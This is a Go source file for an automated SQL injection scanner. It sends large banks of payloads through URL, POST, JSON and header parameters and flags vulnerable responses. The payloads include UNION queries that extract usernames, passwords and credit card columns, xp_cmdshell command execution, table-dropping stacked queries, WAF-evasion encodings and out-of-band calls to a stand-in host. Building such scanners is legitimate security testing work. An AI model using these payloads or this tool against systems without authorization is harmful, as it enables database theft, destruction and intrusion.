// Package scanner — sqli.go
// All SQL Injection detection vectors rebuilt on top of:
//   - Ratio-Based Differential engine  (diff.go)
//   - Multi-Tier Signature matcher      (signatures.go)
//   - Full HTTP Pipeline Reflection     (http.go)
//   - Adaptive Traffic Throttling       (http.go / proxy.go)
package scanner

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/wormsystem/toran_map/utils"
)

// ─────────────────────────── Payload Bank ────────────────────────────────────

var sqliPayloadsStandard = []string{
	// Error-Based (MySQL)
	"'", "''", "`", "1'", "1''", `"`, `1"`,
	"1 AND 1=1", "1 AND 1=2",
	"' OR '1'='1", "' OR '1'='2",
	"' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
	"') OR ('1'='1",
	"1; SELECT 1", "1'; SELECT 1--",
	"1' ORDER BY 1--", "1' ORDER BY 100--",
	"1' GROUP BY 1--",
	"' UNION SELECT 1, username, password, credit_card, 5, 6 FROM users --",
	"1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
	"1' UNION SELECT NULL,NULL,NULL--", "1' UNION SELECT 1,2,3--",
	"1' UNION ALL SELECT NULL--",
	// Boolean-Based
	"1 AND 1=1--", "1 AND 1=2--",
	"1' AND '1'='1", "1' AND '1'='2",
	"1 AND SLEEP(0)--",
	// MSSQL
	"'; EXEC xp_cmdshell('dir')--",
	"1; WAITFOR DELAY '0:0:0'--",
	"1' AND 1=CONVERT(int, 'A')--",
	// Oracle
	"1' AND 1=1 FROM dual--",
	"1 UNION SELECT NULL FROM dual--",
	"' OR 1=1 FROM dual--",
	// Generic polyglot
	`';"` + "/*`--",
	"1/**/OR/**/1=1", "1/*!OR*/1=1",
	"1%27 OR 1=1--", "1%22 OR 1=1--",
}

var sqliPayloadsStealth = []string{
	// MySQL error-based advanced
	"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
	"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
	"' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT version()),0x7e,0x41))s), 8446744073709551610, 8446744073709551610)))--",
	"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM (SELECT 1)a GROUP BY x)--",
	"' AND EXP(~(SELECT * FROM (SELECT version())a))--",
	"' AND (SELECT * FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
	// Time-based
	"'; IF(1=1) WAITFOR DELAY '0:0:5'--",
	"1' AND SLEEP(5)--",
	"1' AND BENCHMARK(5000000,MD5(1))--",
	"1'; SELECT SLEEP(5)--",
	"1 RLIKE SLEEP(5)--",
	"1' XOR SLEEP(5) XOR '",
	"(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'\"*/",
	// Stacked queries
	"1'; INSERT INTO test VALUES(1)--",
	"1'; DROP TABLE IF EXISTS sqli_test--",
	"1'; CREATE TABLE sqli_test(id INT)--",
	// WAF bypass via encoding / comments
	"1'/**/OR/**/1=1--", "1'%09OR%091=1--", "1'+OR+1=1--",
	"1'%0AOR%0A1=1--", "1' OR 0x31=0x31--", "1' OR char(49)=char(49)--",
	"1' oR '1'='1", "1' Or 1=1--", "1' /*!OR*/ 1=1--",
	"1'/*!50000OR*/1=1--", "1' OR/**/'1'='1",
	// Second-order hints
	"admin'--", "admin'#", "' OR username IS NOT NULL--",
	// JSON / XML injection
	"1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(table_name)) USING utf8)))--",
	"' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
	// Geometric / integer overflow
	"' AND GeometryCollection((select * from (select * from(select version())f)x))--",
	"' AND polygon((select * from (select * from(select version())f)x))--",
	"9999999999999999999999' OR 1=1--",
	// Negation tricks
	"' OR NOT 1=2--", "' OR !(1=2)--",
	// LIMIT injection
	"1 LIMIT 1,1--", "1 LIMIT 0,1 UNION SELECT 1,2,3--",
}

// ─────────────────────────── Vector Registry ─────────────────────────────────

type vectorFunc func(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error)

type vector struct {
	name string
	fn   vectorFunc
}

func allVectors() []vector {
	return []vector{
		{name: "Error-Based Detection", fn: vectorErrorBased},
		{name: "Boolean-Based Blind (Differential)", fn: vectorBooleanBased},
		{name: "Time-Based Blind", fn: vectorTimeBased},
		{name: "UNION-Based Column Probing", fn: vectorUnionBased},
		{name: "Double-Quote Injection", fn: vectorDoubleQuote},
		{name: "Comment Termination", fn: vectorCommentTermination},
		{name: "Stacked Queries Detection", fn: vectorStackedQuery},
		{name: "WAF Bypass Encoding", fn: vectorWAFBypass},
		{name: "Numeric Context Injection", fn: vectorNumericContext},
		{name: "Polyglot Payload", fn: vectorPolyglot},
		{name: "Out-of-Band Marker", fn: vectorOOBMarker},
		{name: "Second-Order Hints", fn: vectorSecondOrder},
		{name: "POST Form-Data Injection", fn: vectorPOSTForm},
		{name: "POST JSON Injection", fn: vectorPOSTJSON},
		{name: "Header Injection (Cookie/UA/Referer)", fn: vectorHeaderInjection},
	}
}

// ─────────────────────────── Helper ──────────────────────────────────────────

func mergeEvidence(sigResults []MatchResult) string {
	parts := make([]string, 0, len(sigResults))
	for _, r := range sigResults {
		parts = append(parts, r.Evidence)
	}
	return strings.Join(parts, " | ")
}

func finding(param, payload, vectorName, method, evidence, severity, rawURL string) utils.FindingInfo {
	return utils.FindingInfo{
		Parameter: param,
		Payload:   payload,
		Vector:    vectorName,
		Method:    method,
		Evidence:  evidence,
		Severity:  severity,
		URL:       rawURL,
	}
}

// ─────────────────────────── Vector 1: Error-Based ───────────────────────────

func vectorErrorBased(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := sqliPayloadsStandard
	if stealth {
		payloads = append(payloads, sqliPayloadsStealth...)
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}

		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Error-Based (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "High", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 2: Boolean-Based (Differential) ──────────

func vectorBooleanBased(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	origVal := base.Query().Get(param)
	if origVal == "" {
		origVal = "1"
	}

	type pair struct{ t, f string }
	pairs := []pair{
		{origVal + " AND 1=1", origVal + " AND 1=2"},
		{origVal + "' AND '1'='1", origVal + "' AND '1'='2"},
		{origVal + " AND 2>1", origVal + " AND 2<1"},
	}
	if stealth {
		pairs = append(pairs,
			pair{origVal + "/**/AND/**/1=1", origVal + "/**/AND/**/1=2"},
			pair{origVal + "%09AND%091=1", origVal + "%09AND%091=2"},
		)
	}

	baseBody, _, err := FetchBaseline(ctx, d, base.String())
	if err != nil {
		return nil, nil
	}

	var findings []utils.FindingInfo
	for _, p := range pairs {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		trueBody, _, trueURL, _ := SendGET(ctx, d, base, param, p.t)
		d.Sleep()
		falseBody, _, _, _ := SendGET(ctx, d, base, param, p.f)
		d.Sleep()

		result := DifferentialAnalysis(baseBody, trueBody, falseBody)
		if result.Divergent {
			findings = append(findings, finding(param, p.t,
				"Boolean-Based Blind SQLi (Ratio-Differential)",
				"GET", result.Evidence, "High", trueURL))
			break
		}
	}
	return findings, nil
}

// ─────────────────────────── Vector 3: Time-Based ────────────────────────────

func vectorTimeBased(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	delay := 5
	payloads := []string{
		fmt.Sprintf("' AND SLEEP(%d)--", delay),
		fmt.Sprintf("1' AND SLEEP(%d)--", delay),
		fmt.Sprintf("1 AND SLEEP(%d)--", delay),
		fmt.Sprintf("'; SELECT SLEEP(%d)--", delay),
		fmt.Sprintf("1'; IF(1=1) WAITFOR DELAY '0:0:%d'--", delay),
		fmt.Sprintf("1 WAITFOR DELAY '0:0:%d'--", delay),
	}
	if stealth {
		payloads = append(payloads,
			fmt.Sprintf("1' XOR SLEEP(%d) XOR '", delay),
			fmt.Sprintf("1' AND BENCHMARK(%d,MD5(1))--", delay*1000000),
		)
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		_, _, rawURL, elapsed, err := TimedSendGET(ctx, d, base, param, pl)
		if err == nil && elapsed >= time.Duration(delay-1)*time.Second {
			findings = append(findings, finding(param, pl,
				"Time-Based Blind SQLi",
				"GET",
				fmt.Sprintf("Response delayed %s (threshold %ds)", FormatDuration(elapsed), delay),
				"Critical", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 4: UNION-Based ───────────────────────────

func vectorUnionBased(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	maxCols := 10
	if stealth {
		maxCols = 20
	}

	var findings []utils.FindingInfo
	for cols := 1; cols <= maxCols; cols++ {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		pl := fmt.Sprintf("' UNION SELECT %s--", strings.Join(nulls, ","))
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}

		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			// error means col count mismatch — keep trying
			d.Sleep()
			continue
		}

		// No error — verify with ORDER BY boundary
		orderPl := fmt.Sprintf("' ORDER BY %d--", cols)
		orderBody, _, _, _ := SendGET(ctx, d, base, param, orderPl)
		d.Sleep()
		_, _, _, nextErr := SendGET(ctx, d, base, param, fmt.Sprintf("' ORDER BY %d--", cols+1))

		if nextErr != nil || strings.Contains(strings.ToLower(orderBody), "unknown column") {
			findings = append(findings, finding(param, pl,
				"UNION-Based SQLi",
				"GET",
				fmt.Sprintf("UNION with %d NULLs succeeded; ORDER BY %d fails", cols, cols+1),
				"Critical", rawURL))
			return findings, nil
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 5: Double-Quote ──────────────────────────

func vectorDoubleQuote(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := []string{
		`"`, `" OR "1"="1`, `" OR 1=1--`, `" OR "1"="1"--`,
	}
	if stealth {
		payloads = append(payloads, `" AND SLEEP(0)--`, `"/**/OR/**/"1"="1`)
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Double-Quote SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "High", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 6: Comment Termination ───────────────────

func vectorCommentTermination(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	origVal := base.Query().Get(param)
	if origVal == "" {
		origVal = "1"
	}
	payloads := []string{
		origVal + "--", origVal + "#", origVal + "/*",
		origVal + "' --", origVal + "';--",
	}
	if stealth {
		payloads = append(payloads,
			origVal+"/*!--*/", origVal+"%23", origVal+"--%0A",
		)
	}

	baseBody, _, _ := FetchBaseline(ctx, d, base.String())

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Comment Termination SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "High", rawURL))
			break
		}
		// Differential fallback
		ratio := SimilarityRatio(baseBody, body)
		if ratio < DiffThreshold {
			findings = append(findings, finding(param, pl,
				"Comment Termination (structural change)",
				"GET",
				fmt.Sprintf("Similarity ratio %.2f < threshold %.2f", ratio, DiffThreshold),
				"Medium", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 7: Stacked Queries ───────────────────────

func vectorStackedQuery(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := []string{
		"'; SELECT 1--", "1'; SELECT 1--",
		"'; SELECT version()--", "1'; SELECT version()--",
	}
	if stealth {
		payloads = append(payloads,
			"'; SELECT 1,2,3--", "'; SELECT SLEEP(0)--",
			"'; INSERT INTO toran_test_sqli VALUES(1)--",
		)
	}

	baseBody, _, _ := FetchBaseline(ctx, d, base.String())

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Stacked Query SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "Critical", rawURL))
			break
		}
		ratio := SimilarityRatio(baseBody, body)
		if ratio < DiffThreshold {
			findings = append(findings, finding(param, pl,
				"Stacked Query (structural response change)",
				"GET",
				fmt.Sprintf("Similarity ratio %.2f < threshold %.2f", ratio, DiffThreshold),
				"Medium", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 8: WAF Bypass ────────────────────────────

func vectorWAFBypass(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := []string{
		"1%27%20OR%201=1--", "1%22%20OR%201=1--",
		"1'%09OR%091=1--", "1'%0AOR%0A1=1--",
		"1'/**/OR/**/1=1--", "1'/*!OR*/1=1--",
		"1'/*!50000OR*/1=1--", "1'+OR+1=1--",
	}
	if stealth {
		payloads = append(payloads,
			"1'%00OR%001=1--", "1'%0COR%0C1=1--",
			"1'%0DOR%0D1=1--", "1' OR 0x313d31--",
		)
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGETRaw(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("WAF Bypass SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "Critical", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 9: Numeric Context ───────────────────────

func vectorNumericContext(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := []string{
		"-1 OR 1=1", "-1 OR 1=1--", "0 OR 1=1", "999999 OR 1=1",
		"-1 UNION SELECT 1", "-1 UNION SELECT 1,2", "-1 UNION SELECT 1,2,3",
	}
	if stealth {
		payloads = append(payloads,
			"-1/**/OR/**/1=1", "-1 OR 1=1#",
			"-1 UNION ALL SELECT NULL,NULL,NULL",
			"(SELECT 1 FROM dual WHERE 1=1)",
		)
	}

	baseBody, _, _ := FetchBaseline(ctx, d, base.String())

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Numeric Context SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "High", rawURL))
			break
		}
		ratio := SimilarityRatio(baseBody, body)
		if ratio < DiffThreshold {
			findings = append(findings, finding(param, pl,
				"Numeric Context (data-leak hint)",
				"GET",
				fmt.Sprintf("Similarity ratio %.2f — structural divergence detected", ratio),
				"Medium", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 10: Polyglot ─────────────────────────────

func vectorPolyglot(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	polyglots := []string{
		`';"` + "/*`--",
		"SLEEP(0)/*'/*`/*\"/*\\*/",
		"1;SELECT%201",
		`'"\`,
		`/**/OR/**/1=1--'"`,
	}
	if stealth {
		polyglots = append(polyglots,
			"1'/*--+/*`%00",
			"')((%27))",
			"\x00' OR 1=1--",
		)
	}

	var findings []utils.FindingInfo
	for _, pl := range polyglots {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Polyglot SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "High", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 11: OOB Marker ───────────────────────────

func vectorOOBMarker(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	if !stealth {
		return nil, nil
	}
	payloads := []string{
		"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.oob.test\\\\')))--",
		"' AND (SELECT 1 FROM (SELECT UTL_HTTP.request('http://oob.test/'||version())) FROM dual)--",
	}
	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Out-of-Band Marker (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "Critical", rawURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 12: Second-Order ─────────────────────────

func vectorSecondOrder(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	if !stealth {
		return nil, nil
	}
	payloads := []string{
		"admin'--", "admin'#",
		"' OR username IS NOT NULL--",
		"1' AND 1=1 AND 'x'='x",
	}

	baseBody, baseResp, _ := FetchBaseline(ctx, d, base.String())
	var baseCode int
	if baseResp != nil {
		baseCode = baseResp.StatusCode
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		body, resp, rawURL, err := SendGET(ctx, d, base, param, pl)
		if err != nil {
			continue
		}

		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("Second-Order SQLi (%s)", hits[0].DB),
				"GET", mergeEvidence(hits), "Medium", rawURL))
			break
		}
		if resp != nil && baseCode != 200 && resp.StatusCode == 200 {
			ratio := SimilarityRatio(baseBody, body)
			if ratio < DiffThreshold {
				findings = append(findings, finding(param, pl,
					"Second-Order / Auth Bypass Hint",
					"GET",
					fmt.Sprintf("Status %d→%d, similarity %.2f", baseCode, resp.StatusCode, ratio),
					"High", rawURL))
				break
			}
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 13: POST Form-Data ───────────────────────

func vectorPOSTForm(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := sqliPayloadsStandard
	if stealth {
		payloads = append(payloads, sqliPayloadsStealth...)
	}

	targetURL := base.Scheme + "://" + base.Host + base.Path

	// Gather other params as baseline form fields
	baseParams := make(map[string]string)
	for k, vals := range base.Query() {
		if len(vals) > 0 {
			baseParams[k] = vals[0]
		}
	}

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		params := make(map[string]string)
		for k, v := range baseParams {
			params[k] = v
		}
		params[param] = pl

		req, err := POSTFormRequest(ctx, targetURL, params)
		if err != nil {
			continue
		}
		body, resp, err := d.Do(req)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("POST Form SQLi (%s)", hits[0].DB),
				"POST", mergeEvidence(hits), "High", targetURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 14: POST JSON ────────────────────────────

func vectorPOSTJSON(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	payloads := []string{
		"' OR '1'='1", "1' OR 1=1--", `" OR "1"="1`,
		"1; SELECT 1--", "' UNION SELECT NULL--",
	}
	if stealth {
		payloads = append(payloads,
			"' AND SLEEP(3)--",
			"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
		)
	}

	targetURL := base.Scheme + "://" + base.Host + base.Path

	var findings []utils.FindingInfo
	for _, pl := range payloads {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}

		payload := map[string]interface{}{param: pl}
		req, err := POSTJSONRequest(ctx, targetURL, payload)
		if err != nil {
			continue
		}
		body, resp, err := d.Do(req)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(param, pl,
				fmt.Sprintf("POST JSON SQLi (%s)", hits[0].DB),
				"POST/JSON", mergeEvidence(hits), "High", targetURL))
			break
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Vector 15: Header Injection ─────────────────────

func vectorHeaderInjection(ctx context.Context, d *Dispatcher, base *url.URL, param string, stealth bool) ([]utils.FindingInfo, error) {
	if param != "id" && param != "q" && param != "search" {
		// Only run header injection once per scan (keyed off first numeric-like param)
		return nil, nil
	}

	targets := []struct{ header, payload string }{
		{"Cookie", "session=1' OR '1'='1"},
		{"Cookie", "id=1' OR 1=1--"},
		{"Referer", "' OR '1'='1"},
		{"X-Forwarded-For", "' OR '1'='1"},
		{"User-Agent", "' OR '1'='1"},
	}
	if stealth {
		targets = append(targets,
			struct{ header, payload string }{"X-Custom-Header", "' OR 1=1--"},
			struct{ header, payload string }{"X-Original-URL", "/' OR 1=1--"},
		)
	}

	targetURL := base.String()

	var findings []utils.FindingInfo
	for _, t := range targets {
		select {
		case <-ctx.Done():
			return findings, nil
		default:
		}
		req, err := HeaderInjectionRequest(ctx, targetURL, t.header, t.payload)
		if err != nil {
			continue
		}
		body, resp, err := d.Do(req)
		if err != nil {
			continue
		}
		hits := MatchSignatures(body, resp)
		if len(hits) > 0 {
			findings = append(findings, finding(
				t.header, t.payload,
				fmt.Sprintf("Header Injection SQLi [%s] (%s)", t.header, hits[0].DB),
				"GET/Header", mergeEvidence(hits), "High", targetURL))
		}
		d.Sleep()
	}
	return findings, nil
}

// ─────────────────────────── Main Runner ─────────────────────────────────────

// ScanSQLi runs all vectors against every detected URL parameter concurrently.
func ScanSQLi(ctx context.Context, targetURL string, stealth bool, d *Dispatcher) ([]utils.FindingInfo, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	params := parsed.Query()
	if len(params) == 0 {
		utils.PrintWarning("  No URL parameters detected — injecting generic test parameter 'id=1'")
		params.Set("id", "1")
		parsed.RawQuery = params.Encode()
	}

	vectors := allVectors()

	type task struct {
		param  string
		vector vector
	}

	tasks := make([]task, 0, len(params)*len(vectors))
	for p := range params {
		for _, v := range vectors {
			tasks = append(tasks, task{param: p, vector: v})
		}
	}

	var (
		allFindings []utils.FindingInfo
		mu          sync.Mutex
		wg          sync.WaitGroup
	)

	sem := make(chan struct{}, 8) // concurrency gate

	for _, t := range tasks {
		wg.Add(1)
		go func(t task) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			utils.PrintTestingParam(t.param, t.vector.name)

			findings, err := t.vector.fn(ctx, d, parsed, t.param, stealth)
			if err != nil {
				return
			}
			if len(findings) > 0 {
				mu.Lock()
				allFindings = append(allFindings, findings...)
				mu.Unlock()
				for _, f := range findings {
					utils.PrintError(fmt.Sprintf("  [VULN] %s → param:%s [%s]", f.Vector, f.Parameter, f.Method))
				}
			}
		}(t)
	}

	wg.Wait()
	return allFindings, nil
}
